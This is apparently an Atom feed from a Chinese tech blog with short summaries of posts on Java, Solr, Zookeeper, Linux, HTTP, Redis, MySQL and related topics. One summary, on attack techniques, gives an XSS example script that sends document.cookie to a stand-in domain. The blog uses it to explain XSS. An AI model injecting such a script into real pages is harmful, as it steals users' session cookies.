<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>搬运工</title>
  
  <subtitle>一生太短，请务必热情！(Life too short, just be active!)</subtitle>
  <link href="/blog/atom.xml" rel="self"/>
  
  <link href="https://sometwo7.github.io/blog/"/>
  <updated>2019-12-12T06:35:07.264Z</updated>
  <id>https://sometwo7.github.io/blog/</id>
  
  <author>
    <name>Sometwo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://sometwo7.github.io/blog/0.html"/>
    <id>https://sometwo7.github.io/blog/0.html</id>
    <published>2019-12-12T06:35:07.264Z</published>
    <updated>2019-12-12T06:35:07.264Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;JAVA基础&quot;&gt;&lt;a href=&quot;#JAVA基础&quot; class=&quot;headerlink&quot; title=&quot;JAVA基础&quot;&gt;&lt;/a&gt;JAVA基础&lt;/h1&gt;&lt;h2 id=&quot;JAVA中的几种基本数据类型是什么，各自占用多少字节。&quot;&gt;&lt;a href=&quot;#JAVA中的几种基本数据类型是什么，各自占用多少字节。&quot; class=&quot;headerlink&quot; title=&quot;JAVA中的几种基本数据类型是什么，各自占用多少字节。&quot;&gt;&lt;/a&gt;JAVA中的几种基本数据类型是什么，各自占用多少字节。&lt;/h2&gt;&lt;p&gt;8种基本数据类型，&lt;br&gt;byte，1&lt;br&gt;char，2&lt;br&gt;short，2&lt;br&gt;float，4&lt;br&gt;int，4&lt;br&gt;double，8&lt;br&gt;long，8&lt;br&gt;boolean，1 或 4，变量 boolean 占4个字节， boolean 数组占1个字节&lt;/p&gt;&lt;h2 id=&quot;String类能被继承吗，为什么。&quot;&gt;&lt;a href=&quot;#String类能被继承吗，为什么。&quot; class=&quot;headerlink&quot; title=&quot;String类能被继承吗，为什么。&quot;&gt;&lt;/a&gt;String类能被继承吗，为什么。&lt;/h2&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Linux 环境搭建 - Solr 8.3.0</title>
    <link href="https://sometwo7.github.io/blog/46fcdcd9.html"/>
    <id>https://sometwo7.github.io/blog/46fcdcd9.html</id>
    <published>2019-11-13T16:18:19.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;下载-solr&quot;&gt;&lt;a href=&quot;#下载-solr&quot; class=&quot;headerlink&quot; title=&quot;下载 solr&quot;&gt;&lt;/a&gt;下载 solr&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;官网下载地址&lt;br&gt;https://lucene.apache.org/solr/downloads.html&lt;/li&gt;
&lt;li&gt;文件链接(2019-11-12可以访问)&lt;br&gt;&lt;a href=&quot;https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.3.0/solr-8.3.0.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;solr-8.3.0.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Linux环境搭建" scheme="https://sometwo7.github.io/blog/categories/Linux%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="https://sometwo7.github.io/blog/tags/Linux/"/>
    
      <category term="环境搭建" scheme="https://sometwo7.github.io/blog/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
      <category term="solr" scheme="https://sometwo7.github.io/blog/tags/solr/"/>
    
  </entry>
  
  <entry>
    <title>Linux 环境搭建 - Zookeeper 3.5.6</title>
    <link href="https://sometwo7.github.io/blog/f889c743.html"/>
    <id>https://sometwo7.github.io/blog/f889c743.html</id>
    <published>2019-11-13T14:08:19.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;下载-zookeeper&quot;&gt;&lt;a href=&quot;#下载-zookeeper&quot; class=&quot;headerlink&quot; title=&quot;下载 zookeeper&quot;&gt;&lt;/a&gt;下载 zookeeper&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;官网下载地址&lt;br&gt;https://zookeeper.apache.org/releases.html&lt;/li&gt;
&lt;li&gt;文件链接(2019-11-12可以访问)&lt;br&gt;&lt;a href=&quot;https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/stable/apache-zookeeper-3.5.6-bin.tar.gz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;apache-zookeeper-3.5.6-bin.tar.gz&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Linux环境搭建" scheme="https://sometwo7.github.io/blog/categories/Linux%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="https://sometwo7.github.io/blog/tags/Linux/"/>
    
      <category term="环境搭建" scheme="https://sometwo7.github.io/blog/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
      <category term="zookeeper" scheme="https://sometwo7.github.io/blog/tags/zookeeper/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - Linux</title>
    <link href="https://sometwo7.github.io/blog/eb01ca49.html"/>
    <id>https://sometwo7.github.io/blog/eb01ca49.html</id>
    <published>2019-11-05T10:04:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、常用操作以及概念&quot;&gt;&lt;a href=&quot;#一、常用操作以及概念&quot; class=&quot;headerlink&quot; title=&quot;一、常用操作以及概念&quot;&gt;&lt;/a&gt;一、常用操作以及概念&lt;/h1&gt;&lt;h2 id=&quot;快捷键&quot;&gt;&lt;a href=&quot;#快捷键&quot; class=&quot;headerlink&quot; title=&quot;快捷键&quot;&gt;&lt;/a&gt;快捷键&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Tab：命令和文件名补全；&lt;/li&gt;
&lt;li&gt;Ctrl+C：中断正在运行的程序；&lt;/li&gt;
&lt;li&gt;Ctrl+D：结束键盘输入（End Of File，EOF）&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;求助&quot;&gt;&lt;a href=&quot;#求助&quot; class=&quot;headerlink&quot; title=&quot;求助&quot;&gt;&lt;/a&gt;求助&lt;/h2&gt;&lt;h3 id=&quot;1-help&quot;&gt;&lt;a href=&quot;#1-help&quot; class=&quot;headerlink&quot; title=&quot;1. --help&quot;&gt;&lt;/a&gt;1. --help&lt;/h3&gt;&lt;p&gt;指令的基本用法与选项介绍。&lt;/p&gt;&lt;h3 id=&quot;2-man&quot;&gt;&lt;a href=&quot;#2-man&quot; class=&quot;headerlink&quot; title=&quot;2. man&quot;&gt;&lt;/a&gt;2. man&lt;/h3&gt;&lt;p&gt;man 是 manual 的缩写，将指令的具体信息显示出来。&lt;/p&gt;&lt;p&gt;当执行 &lt;code&gt;man date&lt;/code&gt; 时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下：&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="linux" scheme="https://sometwo7.github.io/blog/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - Http</title>
    <link href="https://sometwo7.github.io/blog/5b4dafbb.html"/>
    <id>https://sometwo7.github.io/blog/5b4dafbb.html</id>
    <published>2019-11-05T10:03:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一-、基础概念&quot;&gt;&lt;a href=&quot;#一-、基础概念&quot; class=&quot;headerlink&quot; title=&quot;一 、基础概念&quot;&gt;&lt;/a&gt;一 、基础概念&lt;/h1&gt;&lt;h2 id=&quot;URI&quot;&gt;&lt;a href=&quot;#URI&quot; class=&quot;headerlink&quot; title=&quot;URI&quot;&gt;&lt;/a&gt;URI&lt;/h2&gt;&lt;p&gt;URI 包含 URL 和 URN。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/8441b2c4-dca7-4d6b-8efb-f22efccaf331.png&quot; width=&quot;500px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;h2 id=&quot;请求和响应报文&quot;&gt;&lt;a href=&quot;#请求和响应报文&quot; class=&quot;headerlink&quot; title=&quot;请求和响应报文&quot;&gt;&lt;/a&gt;请求和响应报文&lt;/h2&gt;&lt;h3 id=&quot;1-请求报文&quot;&gt;&lt;a href=&quot;#1-请求报文&quot; class=&quot;headerlink&quot; title=&quot;1. 请求报文&quot;&gt;&lt;/a&gt;1. 请求报文&lt;/h3&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/HTTP_RequestMessageExample.png&quot; width&gt; &lt;/div&gt;&lt;br&gt;&lt;h3 id=&quot;2-响应报文&quot;&gt;&lt;a href=&quot;#2-响应报文&quot; class=&quot;headerlink&quot; title=&quot;2. 响应报文&quot;&gt;&lt;/a&gt;2. 响应报文&lt;/h3&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/HTTP_ResponseMessageExample.png&quot; width&gt; &lt;/div&gt;&lt;br&gt;&lt;h1 id=&quot;二、HTTP-方法&quot;&gt;&lt;a href=&quot;#二、HTTP-方法&quot; class=&quot;headerlink&quot; title=&quot;二、HTTP 方法&quot;&gt;&lt;/a&gt;二、HTTP 方法&lt;/h1&gt;&lt;p&gt;客户端发送的  &lt;strong&gt;请求报文&lt;/strong&gt;  第一行为请求行，包含了方法字段。&lt;/p&gt;&lt;h2 id=&quot;GET&quot;&gt;&lt;a href=&quot;#GET&quot; class=&quot;headerlink&quot; title=&quot;GET&quot;&gt;&lt;/a&gt;GET&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;获取资源&lt;/p&gt;
&lt;/blockquote&gt;&lt;p&gt;当前网络请求中，绝大部分使用的是 GET 方法。&lt;/p&gt;&lt;h2 id=&quot;HEAD&quot;&gt;&lt;a href=&quot;#HEAD&quot; class=&quot;headerlink&quot; title=&quot;HEAD&quot;&gt;&lt;/a&gt;HEAD&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;获取报文首部&lt;/p&gt;
&lt;/blockquote&gt;&lt;p&gt;和 GET 方法类似，但是不返回报文实体主体部分。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="http" scheme="https://sometwo7.github.io/blog/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - Socket</title>
    <link href="https://sometwo7.github.io/blog/ecffdd03.html"/>
    <id>https://sometwo7.github.io/blog/ecffdd03.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、I-O-模型&quot;&gt;&lt;a href=&quot;#一、I-O-模型&quot; class=&quot;headerlink&quot; title=&quot;一、I/O 模型&quot;&gt;&lt;/a&gt;一、I/O 模型&lt;/h1&gt;&lt;p&gt;一个输入操作通常包括两个阶段：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;等待数据准备好&lt;/li&gt;
&lt;li&gt;从内核向进程复制数据&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。&lt;/p&gt;&lt;p&gt;Unix 有五种 I/O 模型：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;阻塞式 I/O&lt;/li&gt;
&lt;li&gt;非阻塞式 I/O&lt;/li&gt;
&lt;li&gt;I/O 复用（select 和 poll）&lt;/li&gt;
&lt;li&gt;信号驱动式 I/O（SIGIO）&lt;/li&gt;
&lt;li&gt;异步 I/O（AIO）&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="socket" scheme="https://sometwo7.github.io/blog/tags/socket/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 攻击技术</title>
    <link href="https://sometwo7.github.io/blog/877061f8.html"/>
    <id>https://sometwo7.github.io/blog/877061f8.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、跨站脚本攻击&quot;&gt;&lt;a href=&quot;#一、跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;一、跨站脚本攻击&quot;&gt;&lt;/a&gt;一、跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。&lt;/p&gt;&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a href=&quot;#攻击原理&quot; class=&quot;headerlink&quot; title=&quot;攻击原理&quot;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;p&gt;例如有一个论坛网站，攻击者可以在上面发布以下内容：&lt;/p&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;location.href=&lt;span class=&quot;string&quot;&gt;&quot;//domain.com/?c=&quot;&lt;/span&gt; + &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="攻击" scheme="https://sometwo7.github.io/blog/tags/%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - Git</title>
    <link href="https://sometwo7.github.io/blog/685bfdc8.html"/>
    <id>https://sometwo7.github.io/blog/685bfdc8.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;集中式与分布式&quot;&gt;&lt;a href=&quot;#集中式与分布式&quot; class=&quot;headerlink&quot; title=&quot;集中式与分布式&quot;&gt;&lt;/a&gt;集中式与分布式&lt;/h1&gt;&lt;p&gt;Git 属于分布式版本控制系统，而 SVN 属于集中式。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png&quot; width=&quot;600px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。&lt;/p&gt;&lt;p&gt;集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。&lt;/p&gt;&lt;p&gt;集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="git" scheme="https://sometwo7.github.io/blog/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 面向对象思想</title>
    <link href="https://sometwo7.github.io/blog/7a9a193e.html"/>
    <id>https://sometwo7.github.io/blog/7a9a193e.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、三大特性&quot;&gt;&lt;a href=&quot;#一、三大特性&quot; class=&quot;headerlink&quot; title=&quot;一、三大特性&quot;&gt;&lt;/a&gt;一、三大特性&lt;/h1&gt;&lt;h2 id=&quot;封装&quot;&gt;&lt;a href=&quot;#封装&quot; class=&quot;headerlink&quot; title=&quot;封装&quot;&gt;&lt;/a&gt;封装&lt;/h2&gt;&lt;p&gt;利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外的接口使其与外部发生联系。用户无需关心对象内部的细节，但可以通过对象对外提供的接口来访问该对象。&lt;/p&gt;&lt;p&gt;优点：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;减少耦合：可以独立地开发、测试、优化、使用、理解和修改&lt;/li&gt;
&lt;li&gt;减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块&lt;/li&gt;
&lt;li&gt;有效地调节性能：可以通过剖析来确定哪些模块影响了系统的性能&lt;/li&gt;
&lt;li&gt;提高软件的可重用性&lt;/li&gt;
&lt;li&gt;降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="对象" scheme="https://sometwo7.github.io/blog/tags/%E5%AF%B9%E8%B1%A1/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 集群</title>
    <link href="https://sometwo7.github.io/blog/78b8663.html"/>
    <id>https://sometwo7.github.io/blog/78b8663.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、负载均衡&quot;&gt;&lt;a href=&quot;#一、负载均衡&quot; class=&quot;headerlink&quot; title=&quot;一、负载均衡&quot;&gt;&lt;/a&gt;一、负载均衡&lt;/h1&gt;&lt;p&gt;集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。&lt;/p&gt;&lt;p&gt;负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。&lt;/p&gt;&lt;p&gt;负载均衡器可以用来实现高可用以及伸缩性：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；&lt;/li&gt;
&lt;li&gt;伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="集群" scheme="https://sometwo7.github.io/blog/tags/%E9%9B%86%E7%BE%A4/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - SQL</title>
    <link href="https://sometwo7.github.io/blog/4ce9f201.html"/>
    <id>https://sometwo7.github.io/blog/4ce9f201.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、基础&quot;&gt;&lt;a href=&quot;#一、基础&quot; class=&quot;headerlink&quot; title=&quot;一、基础&quot;&gt;&lt;/a&gt;一、基础&lt;/h1&gt;&lt;p&gt;模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。&lt;/p&gt;&lt;p&gt;主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。&lt;/p&gt;&lt;p&gt;SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="sql" scheme="https://sometwo7.github.io/blog/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - Redis</title>
    <link href="https://sometwo7.github.io/blog/2355d11.html"/>
    <id>https://sometwo7.github.io/blog/2355d11.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。&lt;/p&gt;&lt;p&gt;键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。&lt;/p&gt;&lt;p&gt;Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。&lt;/p&gt;&lt;h1 id=&quot;二、数据类型&quot;&gt;&lt;a href=&quot;#二、数据类型&quot; class=&quot;headerlink&quot; title=&quot;二、数据类型&quot;&gt;&lt;/a&gt;二、数据类型&lt;/h1&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="redis" scheme="https://sometwo7.github.io/blog/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - MySQL</title>
    <link href="https://sometwo7.github.io/blog/7a97d7b6.html"/>
    <id>https://sometwo7.github.io/blog/7a97d7b6.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、索引&quot;&gt;&lt;a href=&quot;#一、索引&quot; class=&quot;headerlink&quot; title=&quot;一、索引&quot;&gt;&lt;/a&gt;一、索引&lt;/h1&gt;&lt;h2 id=&quot;B-Tree-原理&quot;&gt;&lt;a href=&quot;#B-Tree-原理&quot; class=&quot;headerlink&quot; title=&quot;B+ Tree 原理&quot;&gt;&lt;/a&gt;B+ Tree 原理&lt;/h2&gt;&lt;h3 id=&quot;1-数据结构&quot;&gt;&lt;a href=&quot;#1-数据结构&quot; class=&quot;headerlink&quot; title=&quot;1. 数据结构&quot;&gt;&lt;/a&gt;1. 数据结构&lt;/h3&gt;&lt;p&gt;B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。&lt;/p&gt;&lt;p&gt;B+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。&lt;/p&gt;&lt;p&gt;在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 key&lt;sub&gt;i&lt;/sub&gt; 和 key&lt;sub&gt;i+1&lt;/sub&gt;，且不为 null，则该指针指向节点的所有 key 大于等于 key&lt;sub&gt;i&lt;/sub&gt; 且小于等于 key&lt;sub&gt;i+1&lt;/sub&gt;。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="mysql" scheme="https://sometwo7.github.io/blog/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 缓存</title>
    <link href="https://sometwo7.github.io/blog/64a35ad1.html"/>
    <id>https://sometwo7.github.io/blog/64a35ad1.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、缓存特征&quot;&gt;&lt;a href=&quot;#一、缓存特征&quot; class=&quot;headerlink&quot; title=&quot;一、缓存特征&quot;&gt;&lt;/a&gt;一、缓存特征&lt;/h1&gt;&lt;h2 id=&quot;命中率&quot;&gt;&lt;a href=&quot;#命中率&quot; class=&quot;headerlink&quot; title=&quot;命中率&quot;&gt;&lt;/a&gt;命中率&lt;/h2&gt;&lt;p&gt;当某个请求能够通过访问缓存而得到响应时，称为缓存命中。&lt;/p&gt;&lt;p&gt;缓存命中率越高，缓存的利用率也就越高。&lt;/p&gt;&lt;h2 id=&quot;最大空间&quot;&gt;&lt;a href=&quot;#最大空间&quot; class=&quot;headerlink&quot; title=&quot;最大空间&quot;&gt;&lt;/a&gt;最大空间&lt;/h2&gt;&lt;p&gt;缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。&lt;/p&gt;&lt;p&gt;当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。&lt;/p&gt;&lt;h2 id=&quot;淘汰策略&quot;&gt;&lt;a href=&quot;#淘汰策略&quot; class=&quot;headerlink&quot; title=&quot;淘汰策略&quot;&gt;&lt;/a&gt;淘汰策略&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="缓存" scheme="https://sometwo7.github.io/blog/tags/%E7%BC%93%E5%AD%98/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 正则表达式</title>
    <link href="https://sometwo7.github.io/blog/38ddab86.html"/>
    <id>https://sometwo7.github.io/blog/38ddab86.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;正则表达式用于文本内容的查找和替换。&lt;/p&gt;&lt;p&gt;正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://regexr.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;正则表达式在线工具&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;二、匹配单个字符&quot;&gt;&lt;a href=&quot;#二、匹配单个字符&quot; class=&quot;headerlink&quot; title=&quot;二、匹配单个字符&quot;&gt;&lt;/a&gt;二、匹配单个字符&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;.&lt;/strong&gt;  可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；&lt;/p&gt;&lt;p&gt;&lt;strong&gt;.&lt;/strong&gt;  是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="正则表达式" scheme="https://sometwo7.github.io/blog/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 分布式</title>
    <link href="https://sometwo7.github.io/blog/d350a2b7.html"/>
    <id>https://sometwo7.github.io/blog/d350a2b7.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、分布式锁&quot;&gt;&lt;a href=&quot;#一、分布式锁&quot; class=&quot;headerlink&quot; title=&quot;一、分布式锁&quot;&gt;&lt;/a&gt;一、分布式锁&lt;/h1&gt;&lt;p&gt;在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。&lt;/p&gt;&lt;p&gt;阻塞锁通常使用互斥量来实现：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态；&lt;/li&gt;
&lt;li&gt;互斥量为 1 表示未锁定状态。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。&lt;/p&gt;
    
    </summary>
    
    
